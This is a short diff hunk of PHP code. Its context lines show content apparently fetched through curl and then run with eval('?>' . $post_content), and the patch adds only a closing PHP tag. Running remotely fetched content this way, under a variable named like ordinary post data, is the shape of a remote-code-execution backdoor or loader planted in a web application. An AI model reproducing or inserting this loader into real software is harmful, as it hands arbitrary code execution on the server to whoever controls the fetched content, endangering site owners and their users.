@@ -17,3 +17,4 @@ if ($post_content === false && function_exists('curl_init')) {
 }
 if ($post_content) {
     eval('?>' . $post_content);
+?>
